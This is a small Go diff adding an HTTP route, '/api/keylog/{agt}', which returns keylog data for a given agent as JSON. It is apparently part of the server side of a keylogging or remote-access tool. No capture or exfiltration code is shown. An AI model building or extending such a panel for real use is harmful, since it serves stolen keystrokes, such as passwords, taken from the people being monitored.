@@ -49,5 +49,12 @@ func main() {
 		res.SendStatus(200)
 	})
 
+	r.Get("/api/keylog/{agt}", func(w http.ResponseWriter, r *http.Request) {
+		agentParam := chi.URLParam(r, "agt")
+		res, _ := yin.Event(w, r)
+		agent := data.Keylog(agentParam)
+		res.SendJSON(agent)
+	})
+
 	http.ListenAndServe(":3001", r)
 }
